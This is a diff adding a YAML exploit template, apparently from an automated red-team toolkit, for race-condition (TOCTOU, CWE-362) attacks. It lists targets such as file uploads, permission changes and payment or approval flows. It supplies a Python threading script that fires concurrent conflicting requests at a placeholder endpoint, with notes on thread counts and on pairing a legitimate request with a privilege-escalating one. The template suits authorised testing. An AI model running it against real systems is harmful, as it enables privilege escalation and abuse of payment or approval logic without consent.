@@ -1,0 +1,28 @@
+metadata:
+  id: cwe-362-race-condition
+  name: Race Condition / TOCTOU
+  cwe_ids:
+  - CWE-362
+  target_type: generic
+  tags:
+  - race-condition
+  - toc-tou
+  - concurrent
+  - privilege-escalation
+  - threading
+  author: co-redteam
+  severity: high
+content: "Typical scenarios:\n- File upload: TOCTOU race between check and use\n-\
+  \ Permission change: non-atomic check-then-update operations\n- Resource allocation:\
+  \ concurrent requests competing for same resource\n- State transition: payment/approval\
+  \ multi-state systems\n\nGeneric exploit framework (Python threading):\nimport requests,urllib3,json,threading,time;\
+  \ urllib3.disable_warnings(); base='{TARGET_BASE_URL}'\ns=requests.Session(); s.verify={VERIFY_FLAG}\n\
+  results=[]; errors=[]\ndef race_req(payload_data, label):\n    try:\n        r=s.post(f'{base}{RACE_ENDPOINT}',\
+  \ data=payload_data, cookies=s.cookies)\n        results.append((label,r.status_code,r.text[:200]))\n\
+  \    except Exception as e: errors.append(str(e))\nthreads=[threading.Thread(target=race_req,args=(data1,'req1')),\
+  \ threading.Thread(target=race_req,args=(data2,'req2'))]\n[t.start() for t in threads];\
+  \ [t.join() for t in threads]\nprint('###CHAIN_OUTPUT###'+json.dumps({'results':results,'errors':errors}))\n\
+  \nKey points:\n- Concurrent threads typically 10-50, depends on TOCTOU window size\n\
+  - Two requests MUST have conflicting params (one legitimate, one privilege-escalating)\n\
+  - Multiple retry loops needed (race window may be milliseconds)\n- Success indicator:\
+  \ response shows trace of escalated operation\n"
